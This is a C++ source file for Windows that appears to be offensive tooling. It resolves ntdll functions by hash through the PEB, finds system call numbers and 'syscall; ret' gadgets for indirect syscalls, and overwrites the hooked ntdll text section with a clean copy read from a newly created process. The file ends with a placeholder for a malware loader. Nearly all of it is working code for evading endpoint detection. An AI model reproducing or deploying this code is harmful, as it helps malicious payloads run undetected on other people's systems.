#include <iostream>
#include "structs.h"

#define NT_SUCCESS(Status) ((NTSTATUS)(Status) >= 0)
#define OBJ_CASE_INSENSITIVE 0x00000040L

EXTERN_C PVOID GetNTDLLFunc(DWORD func) {

    PVOID PebBase = (PVOID)__readgsqword(0x60); // <-- peb addr on x64 bit

    PPEB b = (PPEB)PebBase;

    PEB_LDR_DATA* ldr = b->Ldr;
    LIST_ENTRY* Head = &ldr->InMemoryOrderModuleList;
    LIST_ENTRY* pEntry = Head->Flink;

    PVOID dllBase = NULL;

    wchar_t sModuleName[] = {'n','t','d','l','l','.','d','l','l','\0'};

    while (pEntry != Head) {

        pEntry = pEntry->Flink;

        PLDR_DATA_TABLE_ENTRY2 data = (PLDR_DATA_TABLE_ENTRY2)((BYTE*)pEntry - sizeof(LIST_ENTRY));

        if (_stricmp((const char*)data->BaseDllName.Buffer, (const char*)sModuleName) == 0) {
            dllBase = data->DllBase;
            if (func == 5) {
                return dllBase;
            }
            break;
        }
    }
    
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)dllBase;
    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)((DWORD_PTR)dllBase + dos->e_lfanew);

    DWORD expRVA = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;

    PIMAGE_EXPORT_DIRECTORY expDir = (PIMAGE_EXPORT_DIRECTORY)((DWORD_PTR)dllBase + expRVA);

    PWORD addrOrds = (PWORD)((DWORD_PTR)dllBase + expDir->AddressOfNameOrdinals);
    PDWORD addrFunctions = (PDWORD)((DWORD_PTR)dllBase + expDir->AddressOfFunctions);
    PDWORD addrNames = (PDWORD)((DWORD_PTR)dllBase + expDir->AddressOfNames);

    DWORD_PTR funcRVA = 0;

    for (DWORD i = 0; i < expDir->NumberOfFunctions; i++) {

        DWORD_PTR name = (DWORD_PTR)dllBase + addrNames[i];
        char* functionName = (char*)name;
        DWORD funcHash = dohash(functionName);

        if (funcHash == func) {
            funcAddr = (PDWORD)((DWORD_PTR)dllBase + (DWORD_PTR)addrFunctions[addrOrds[i]]);
            if (func == 0x006af74b3) { // that's for our RtlInitUnicodeString
                return funcAddr;
            }
            break;
        }
    }
    
    if (funcAddr == NULL) {
        return FALSE;
    }
  
    // get "syscall ; ret"  address
  
    char buffer[32];
    memcpy(buffer, funcAddr, 32);
  
    for (int i = 0; i < sizeof(buffer); i++) {

        if ((PBYTE)buffer[i + 1] == (PBYTE)5 && (PBYTE)buffer[i + 2] == (PBYTE)-61) {

            return ((PBYTE)funcAddr + (BYTE)i);
            break;
        }
    }
}

EXTERN_C BYTE SyscallNum(DWORD func) {
  
    PVOID dllBase = GetNTDLLFunc(5);
    auto nt = (PIMAGE_NT_HEADERS)((DWORD_PTR)dllBase + ((PIMAGE_DOS_HEADER)dllBase)->e_lfanew);
    auto rva = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;

    auto exp = (PIMAGE_EXPORT_DIRECTORY)((DWORD_PTR)dllBase + rva);
    auto dll = (PDWORD)((DWORD_PTR)dllBase + exp->Name);
  
    // SSN Resolve Method via - https://www.mdsec.co.uk/2022/04/resolving-system-service-numbers-using-the-exception-directory/

    // Load the Exception Directory.
    rva = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXCEPTION].VirtualAddress;
    auto rtf = (PIMAGE_RUNTIME_FUNCTION_ENTRY)((DWORD_PTR)dllBase + rva);

    // Load the Export Address Table.
    rva = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
    auto adr = (PDWORD)((DWORD_PTR)dllBase + exp->AddressOfFunctions);
    auto sym = (PDWORD)((DWORD_PTR)dllBase + exp->AddressOfNames);
    auto ord = (PWORD)((DWORD_PTR)dllBase + exp->AddressOfNameOrdinals);

    int ssn = 0;
    int assn = 0;
    // Search runtime function table.
    for (int i = 0; rtf[i].BeginAddress; i++) {
        // Search export address table.
        for (int j = 0; j < exp->NumberOfFunctions; j++) {

            DWORD_PTR functionNameVA = (DWORD_PTR)dllBase + sym[j];
            char* functionName = (char*)functionNameVA;
            DWORD funcNameHash = dohash(functionName);
            // begin address rva?
            if (adr[ord[j]] == rtf[i].BeginAddress) {
                auto api = (PCHAR)((DWORD_PTR)dllBase + sym[j]); //dllbase + addrnameRVA = function Name
                auto s1 = api;

                auto s2 = functionName;
                while (*s1 && (*s1 == *s2)) s1++, s2++;
                int cmp = (int)*(PBYTE)s1 - *(PBYTE)s2;
                if (funcNameHash == func) {
                    DWORD functionAddressRVA = adr[ord[j]];
                    funcAddr = (PDWORD)((DWORD_PTR)dllBase + functionAddressRVA);
                    if (!cmp) return (DWORD)ssn;
                }
                // if this is a syscall, increase the ssn value.
                if (*(USHORT*)api == 'wZ') ssn++;
            }
        }
    }
    return (DWORD)ssn;
}

BOOL Unhk(HANDLE hProc) {

    PIMAGE_DOS_HEADER ntDos = (PIMAGE_DOS_HEADER)ntdllAddr;
    PIMAGE_NT_HEADERS ntNT = (PIMAGE_NT_HEADERS)((DWORD_PTR)ntdllAddr + ntDos->e_lfanew);
    PVOID clean = NULL;
    NTSTATUS status;
    SIZE_T virtualSize = {};
    PVOID virtualAddress = NULL;

    for (int i = 0; i < ntNT->FileHeader.NumberOfSections; i++) {

        PIMAGE_SECTION_HEADER ntSection = (PIMAGE_SECTION_HEADER)((unsigned _int64)IMAGE_FIRST_SECTION(ntNT) + ((unsigned _int64)IMAGE_SIZEOF_SECTION_HEADER * i));

        if (strcmp((char*)ntSection->Name, ".text") == 0) {

            DWORD Old;
            virtualSize = ntSection->Misc.VirtualSize;
            virtualAddress = (PVOID)((unsigned _int64)ntdllAddr + ntSection->VirtualAddress);

            status = MyNtAllocateVirtualMemory((HANDLE)-1, &clean, NULL, &virtualSize, MEM_COMMIT, PAGE_READWRITE);
            if (!NT_SUCCESS(status)) {
                printf("[-] Allocate error: %d\n", GetLastError());
                return FALSE;
            }
            status = MyNtReadVirtualMemory(hProc, virtualAddress, clean, virtualSize, NULL);
            if(!NT_SUCCESS(status)){
                printf("[-] Reading error: %d\n", GetLastError());
                return FALSE;
            }

            status = MyNtProtectVirtualMemory((HANDLE)-1, &virtualAddress, &virtualSize, PAGE_EXECUTE_READWRITE, &Old);
            if (!NT_SUCCESS(status)) {
                printf("[-] 1st VirtualProtect Failed! %d\n", GetLastError());
                return FALSE;
            }

            for (int j = 0; j < ntSection->Misc.VirtualSize; j++) {
                ((char*)ntdllAddr + ntSection->VirtualAddress)[j] = ((char*)clean)[j];
            }

            status = MyNtProtectVirtualMemory((HANDLE)-1, &virtualAddress, &virtualSize, Old, &Old);
            if (!NT_SUCCESS(status)) {
                printf("[-] 2nd VirtualProtect Failed! %d\n", GetLastError());
                return FALSE;
            }
        }
        break;
    }

    status = MyNtFreeVirtualMemory((HANDLE)-1, &clean, &virtualSize, MEM_RELEASE);
    if (!NT_SUCCESS(status))
        printf("[-] Releasing error: %d\n", GetLastError());

    return TRUE;

}

BOOL ClearNTDLL() {

    ntdllAddr = GetNTDLLFunc(5);
    RtlInitUnicodeString = (_RtlInitUnicodeString)GetNTDLLFunc(0x006af74b3);

    NTSTATUS status;
    HANDLE sectHandle, hFile, hProc = NULL;
    IO_STATUS_BLOCK iosb = {};
    OBJECT_ATTRIBUTES oa;
    UNICODE_STRING filePath;

    // init unicode
    RtlInitUnicodeString(&filePath, L"\\??\\C:\\Windows\\System32\\WEB.rs");
    InitializeObjectAttributes(&oa, &filePath, OBJ_CASE_INSENSITIVE, NULL, NULL);

    status = MyNtCreateFile(&hFile, FILE_GENERIC_READ, &oa, &iosb, 0, FILE_ATTRIBUTE_NORMAL, FILE_SHARE_READ, OPEN_EXISTING, NULL, NULL, 0);
    if (!NT_SUCCESS(status)) {
        printf("CreateFile error.\n");
        return FALSE;
    }

    status = MyNtCreateSection(&sectHandle, SECTION_ALL_ACCESS, NULL, NULL, PAGE_READONLY, SEC_IMAGE, hFile);
    if (!NT_SUCCESS(status)) {
        printf("Section Creation error.\n");
        if (!CloseHandle(sectHandle))
            printf("[-] Closing Section Handle error: %d\n", GetLastError());
        if (!CloseHandle(hFile))
            printf("[-] Closing File Handle error: %d\n", GetLastError());
        return FALSE;
    }

    status = MyNtCreateProcessEx(&hProc, PROCESS_ALL_ACCESS, NULL, (HANDLE)-1, HANDLE_FLAG_INHERIT, sectHandle, NULL, NULL, 0);
    if (!NT_SUCCESS(status)) {
        printf("[-] Process Creation error.\n");
        if (!CloseHandle(sectHandle))
            printf("[-] Closing Section Handle error: %d\n", GetLastError());
        if (!CloseHandle(hFile))
            printf("[-] Closing File Handle error: %d\n", GetLastError());
        return FALSE;
    }

    // now we got the rogue process handle, let's unhook.
    if (!Unhk(hProc)) {
        printf("[-] Error farting.\n");
        if (!CloseHandle(sectHandle))
            printf("[-] Closing Section Handle error: %d\n", GetLastError());
        if (!CloseHandle(hFile))
            printf("[-] Closing File Handle error: %d\n", GetLastError());
        return FALSE;
    }
    
    status = MyNtTerminateProcess(hProc, 0);
    if (!NT_SUCCESS(status)) {
        printf("[-] NtTerminateProcess error.\n");
    }
  
  
    // Close section & file handle
    if (!CloseHandle(sectHandle))
        printf("[-] Closing Section Handle error: %d\n", GetLastError());

    if (!CloseHandle(hFile))
        printf("[-] Closing File Handle error: %d\n", GetLastError());

    return TRUE;

}

int main() {

    // Unhook NTDLL via indirect syscalls
    if (!ClearNTDLL()) {
        printf("[-] Error unhooking.\n");
        return -1;
    }

    getchar();

    /*
    
    YOUR LOADER HERE
    
    */

    return 0;

}
